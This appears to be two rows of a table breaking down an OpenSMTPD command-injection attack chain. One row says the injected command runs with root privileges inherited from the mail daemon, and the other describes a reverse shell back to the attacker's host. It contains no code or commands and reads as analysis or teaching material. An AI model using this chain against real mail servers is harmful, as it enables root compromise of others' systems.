7	OpenSMTPD delivery processes inherit root privileges from the parent daemon — the injected command executes with full root-level system access	Privileges
8	A reverse shell is established over the network from the target back to the attacker's host, providing interactive root access to the compromised system	Destination
